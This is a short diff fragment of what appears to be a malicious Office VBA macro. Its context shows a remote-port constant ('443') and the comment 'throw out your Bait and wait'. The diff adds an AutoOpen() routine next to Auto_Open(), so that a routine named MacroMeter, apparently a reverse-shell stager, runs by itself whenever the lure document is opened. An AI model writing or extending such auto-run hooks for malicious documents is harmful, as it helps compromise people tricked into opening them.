@@ -33,6 +33,10 @@ Public Const RPORT As String = "443"
 
 'Then throw out your Bait and wait...
 
+Sub AutoOpen()
+    MacroMeter
+End Sub
+
 Sub Auto_Open()
     MacroMeter
 End Sub
